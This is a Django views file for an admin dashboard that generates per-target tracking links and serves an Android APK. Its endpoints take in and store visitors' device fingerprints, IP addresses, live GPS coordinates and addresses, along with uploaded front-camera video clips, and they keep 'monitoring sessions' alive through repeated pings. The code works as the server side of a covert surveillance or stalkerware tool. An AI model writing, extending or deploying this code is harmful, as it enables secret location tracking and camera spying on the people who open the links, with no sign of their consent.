import uuid
import json
import os
from django.shortcuts import render, redirect, get_object_or_404
from django.http import JsonResponse, HttpResponse
from django.views.decorators.csrf import csrf_exempt
from django.contrib.auth import login, logout, authenticate
from django.contrib.auth.forms import AuthenticationForm
from django.contrib.auth.decorators import login_required
from django.contrib import messages
from django.utils import timezone
from .models import DeviceLink, CapturedDeviceDetail, EnterpriseAsset, CapturedVideo

def login_view(request):
    if request.user.is_authenticated:
        return redirect('dashboard')

    if request.method == 'POST':
        form = AuthenticationForm(request, data=request.POST)
        if form.is_valid():
            username = form.cleaned_data.get('username')
            password = form.cleaned_data.get('password')
            user = authenticate(username=username, password=password)
            if user is not None:
                login(request, user)
                messages.success(request, f"Welcome back, {user.username}!")
                return redirect('dashboard')
            else:
                messages.error(request, "Invalid username or password.")
        else:
            messages.error(request, "Invalid credentials provided.")
    else:
        form = AuthenticationForm()

    return render(request, 'admin_panel/login.html', {'form': form})


@login_required
def dashboard_view(request):
    links = DeviceLink.objects.all()
    captured_devices = CapturedDeviceDetail.objects.all()
    enterprise_assets = EnterpriseAsset.objects.all()

    total_links = links.count()
    total_captured = captured_devices.count()
    total_assets = enterprise_assets.count()
    
    # Active live devices (pinged within 10 seconds and session status active)
    active_live_count = sum(1 for d in captured_devices if d.is_recently_active)

    host_url = request.build_absolute_uri('/')[:-1]

    context = {
        'links': links,
        'captured_devices': captured_devices,
        'enterprise_assets': enterprise_assets,
        'total_links': total_links,
        'total_captured': total_captured,
        'total_assets': total_assets,
        'active_live_count': active_live_count,
        'host_url': host_url,
    }
    return render(request, 'admin_panel/dashboard.html', context)


@login_required
def generate_link(request):
    if request.method == 'POST':
        target_label = request.POST.get('target_label', '').strip() or "Android Device User"
        token = uuid.uuid4().hex[:12]
        link_obj = DeviceLink.objects.create(token=token, target_label=target_label)
        messages.success(request, f"New link generated for '{target_label}'!")
        return redirect('dashboard')
    return redirect('dashboard')


@login_required
def delete_device(request, device_id):
    device = get_object_or_404(CapturedDeviceDetail, id=device_id)
    model_name = device.device_model
    
    # Delete from database
    device.delete()
    messages.success(request, f"Stopped monitoring session and deleted device record for '{model_name}'.")
    return redirect('dashboard')


@login_required
def delete_link(request, link_id):
    link_obj = get_object_or_404(DeviceLink, id=link_id)
    label = link_obj.target_label
    link_obj.delete()
    messages.success(request, f"Deleted inspection link '{label}'.")
    return redirect('dashboard')


@login_required
def get_device_detail_json(request, device_id):
    device = get_object_or_404(CapturedDeviceDetail, id=device_id)
    
    # Gather videos
    videos = []
    for v in device.recorded_videos.all().order_by('-recorded_at'):
        videos.append({
            'id': v.id,
            'url': v.video_file.url if v.video_file else '',
            'recorded_at': v.recorded_at.strftime('%Y-%m-%d %H:%M:%S'),
            'duration_sec': v.duration_sec,
            'file_size_mb': v.file_size_mb
        })

    data = {
        'id': device.id,
        'device_model': device.device_model,
        'os_info': device.os_info,
        'browser_info': device.browser_info,
        'ip_address': device.ip_address,
        'user_agent': device.user_agent,
        'screen_res': device.screen_res,
        'viewport_size': device.viewport_size,
        'pixel_ratio': device.pixel_ratio,
        'gpu_info': device.gpu_info,
        'battery_info': device.battery_info,
        'network_info': device.network_info,
        'cpu_cores': device.cpu_cores,
        'ram_gb': device.ram_gb,
        'timezone': device.timezone,
        'language': device.language,
        'latitude': device.latitude,
        'longitude': device.longitude,
        'location_accuracy': device.location_accuracy,
        'location_status': device.location_status,
        'location_address': device.location_address,
        'maps_url': device.maps_url,
        'location_updated_at': device.location_updated_at.strftime('%Y-%m-%d %H:%M:%S') if device.location_updated_at else None,

        'session_status': device.session_status,
        'session_state': device.session_state,
        'is_online': device.is_online,
        'page_focused': device.page_focused,
        'orientation': device.orientation,
        'is_recently_active': device.is_recently_active,
        'last_ping': device.last_ping.strftime('%Y-%m-%d %H:%M:%S'),
        'captured_at': device.captured_at.strftime('%Y-%m-%d %H:%M:%S'),
        'link_label': device.link.target_label if device.link else 'N/A',
        'videos': videos
    }
    return JsonResponse({'status': 'success', 'device': data})


@login_required
def api_live_devices(request):
    devices = CapturedDeviceDetail.objects.all()
    data = []
    for d in devices:
        data.append({
            'id': d.id,
            'device_model': d.device_model,
            'os_info': d.os_info,
            'battery_info': d.battery_info,
            'network_info': d.network_info,
            'ip_address': d.ip_address,
            'latitude': d.latitude,
            'longitude': d.longitude,
            'maps_url': d.maps_url,
            'location_status': d.location_status,
            'location_address': d.location_address,
            'session_status': d.session_status,

            'session_state': d.session_state,
            'is_recently_active': d.is_recently_active,
            'page_focused': d.page_focused,
            'orientation': d.orientation,
            'last_ping': d.last_ping.strftime('%H:%M:%S')
        })
    return JsonResponse({'status': 'success', 'devices': data})


def download_app(request):
    apk_path = os.path.join(os.path.dirname(__file__), 'static', 'downloads', 'AndroidInspector.apk')
    if os.path.exists(apk_path):
        with open(apk_path, 'rb') as f:
            response = HttpResponse(f.read(), content_type='application/vnd.android.package-archive')
            response['Content-Disposition'] = 'attachment; filename="AndroidInspector.apk"'
            return response
    return HttpResponse("APK package file not found.", status=404)


@csrf_exempt
def register_asset(request):
    if request.method == 'POST':
        try:
            data = json.loads(request.body.decode('utf-8'))
            phone_number = data.get('phone_number', '').strip()
            if not phone_number:
                return JsonResponse({'status': 'error', 'message': 'Phone number is required'}, status=400)
            
            asset_id = data.get('asset_id') or uuid.uuid4().hex[:12]
            asset, created = EnterpriseAsset.objects.get_or_create(asset_id=asset_id)
            asset.phone_number = phone_number
            asset.device_model = data.get('device_model', 'Android Enterprise Device')
            asset.os_info = data.get('os_info', 'Android OS')
            asset.admin_active = bool(data.get('admin_active', False))
            asset.password_compliant = bool(data.get('password_compliant', False))
            asset.save()

            return JsonResponse({
                'status': 'success',
                'asset_id': asset.asset_id,
                'message': 'Enterprise device asset registered successfully'
            })
        except Exception as e:
            return JsonResponse({'status': 'error', 'message': str(e)}, status=400)
    return JsonResponse({'status': 'error', 'message': 'Invalid request method'}, status=405)


def inspect_device(request, token):
    link_obj = get_object_or_404(DeviceLink, token=token)
    link_obj.click_count += 1
    link_obj.save()

    context = {
        'token': token,
        'link_obj': link_obj
    }
    return render(request, 'admin_panel/inspect_device.html', context)


@csrf_exempt
def submit_device_info(request, token):
    if request.method == 'POST':
        try:
            link_obj = DeviceLink.objects.filter(token=token).first()
            data = json.loads(request.body.decode('utf-8'))
            
            session_token = data.get('session_token')
            
            # Check if existing session
            device_record = None
            if session_token:
                device_record = CapturedDeviceDetail.objects.filter(session_token=session_token).first()
                if not device_record:
                    return JsonResponse({
                        'status': 'stopped',
                        'message': 'Monitoring session terminated by admin'
                    })
                elif device_record.session_status == 'stopped':
                    return JsonResponse({
                        'status': 'stopped',
                        'message': 'Monitoring session terminated by admin'
                    })
            
            x_forwarded = request.META.get('HTTP_X_FORWARDED_FOR')
            if x_forwarded:
                ip_address = x_forwarded.split(',')[0].strip()
            else:
                ip_address = request.META.get('REMOTE_ADDR', '127.0.0.1')

            user_agent = request.META.get('HTTP_USER_AGENT', data.get('user_agent', ''))

            # Extract GPS data
            latitude = data.get('latitude')
            longitude = data.get('longitude')
            location_accuracy = data.get('location_accuracy')
            location_status = data.get('location_status', 'Pending')
            location_address = data.get('location_address')

            if not device_record:
                session_token = uuid.uuid4().hex
                device_record = CapturedDeviceDetail.objects.create(
                    link=link_obj,
                    session_token=session_token,
                    session_status='active',
                    ip_address=ip_address,
                    user_agent=user_agent,
                    device_model=data.get('device_model', 'Android Device'),
                    os_info=data.get('os_info', 'Android'),
                    browser_info=data.get('browser_info', 'Chrome Mobile'),
                    screen_res=data.get('screen_res', 'Unknown'),
                    viewport_size=data.get('viewport_size', 'Unknown'),
                    pixel_ratio=str(data.get('pixel_ratio', '1.0')),
                    gpu_info=data.get('gpu_info', 'Unknown GPU'),
                    battery_info=data.get('battery_info', 'Unknown'),
                    network_info=data.get('network_info', 'Unknown'),
                    cpu_cores=int(data.get('cpu_cores', 0)),
                    ram_gb=str(data.get('ram_gb', 'Unknown')),
                    timezone=data.get('timezone', 'UTC'),
                    language=data.get('language', 'en-US'),
                    latitude=float(latitude) if latitude is not None else None,
                    longitude=float(longitude) if longitude is not None else None,
                    location_accuracy=float(location_accuracy) if location_accuracy is not None else None,
                    location_status=location_status,
                    location_address=location_address,
                    location_updated_at=timezone.now() if latitude is not None else None,
                    is_online=bool(data.get('is_online', True)),
                    page_focused=bool(data.get('page_focused', True)),
                    orientation=data.get('orientation', 'portrait')
                )
            else:
                device_record.battery_info = data.get('battery_info', device_record.battery_info)
                device_record.network_info = data.get('network_info', device_record.network_info)
                device_record.viewport_size = data.get('viewport_size', device_record.viewport_size)
                device_record.is_online = bool(data.get('is_online', True))
                device_record.page_focused = bool(data.get('page_focused', True))
                device_record.orientation = data.get('orientation', device_record.orientation)
                device_record.ip_address = ip_address

                if latitude is not None and longitude is not None:
                    device_record.latitude = float(latitude)
                    device_record.longitude = float(longitude)
                    device_record.location_accuracy = float(location_accuracy) if location_accuracy is not None else device_record.location_accuracy
                    device_record.location_status = location_status
                    if location_address:
                        device_record.location_address = location_address
                    device_record.location_updated_at = timezone.now()
                elif location_status:
                    device_record.location_status = location_status
                    if location_address:
                        device_record.location_address = location_address


                device_record.last_ping = timezone.now()
                device_record.save()

            return JsonResponse({
                'status': 'active',
                'session_token': device_record.session_token,
                'message': 'Telemetry & GPS recorded successfully'
            })
        except Exception as e:
            return JsonResponse({'status': 'error', 'message': str(e)}, status=400)

    return JsonResponse({'status': 'error', 'message': 'Invalid request method'}, status=405)


@csrf_exempt
def upload_video(request, token):
    if request.method == 'POST':
        try:
            session_token = request.POST.get('session_token')
            if not session_token:
                return JsonResponse({'status': 'error', 'message': 'Session token is required'}, status=400)
            
            device_record = CapturedDeviceDetail.objects.filter(session_token=session_token).first()
            if not device_record:
                return JsonResponse({'status': 'error', 'message': 'Device record not found for session'}, status=404)
            
            video_file = request.FILES.get('video') or request.FILES.get('file')
            if not video_file:
                return JsonResponse({'status': 'error', 'message': 'No video file uploaded'}, status=400)

            duration_sec = int(request.POST.get('duration_sec', 0))
            size_mb = round(video_file.size / (1024 * 1024), 2)
            file_size_str = f"{size_mb} MB" if size_mb >= 0.1 else f"{round(video_file.size / 1024, 1)} KB"

            video_obj = CapturedVideo.objects.create(
                device=device_record,
                video_file=video_file,
                duration_sec=duration_sec,
                file_size_mb=file_size_str
            )

            return JsonResponse({
                'status': 'success',
                'video_id': video_obj.id,
                'video_url': video_obj.video_file.url,
                'message': 'Front camera video recorded & uploaded successfully'
            })
        except Exception as e:
            return JsonResponse({'status': 'error', 'message': str(e)}, status=400)

    return JsonResponse({'status': 'error', 'message': 'Invalid request method'}, status=405)



def sw_js(request):
    sw_path = os.path.join(os.path.dirname(__file__), 'templates', 'admin_panel', 'sw.js')
    with open(sw_path, 'r', encoding='utf-8') as f:
        content = f.read()
    response = HttpResponse(content, content_type='application/javascript')
    response['Service-Worker-Allowed'] = '/'
    return response


def manifest_json(request):
    manifest_path = os.path.join(os.path.dirname(__file__), 'templates', 'admin_panel', 'manifest.json')
    with open(manifest_path, 'r', encoding='utf-8') as f:
        content = f.read()
    return HttpResponse(content, content_type='application/json')


def logout_view(request):
    logout(request)
    messages.info(request, "Logged out successfully.")
    return redirect('login')
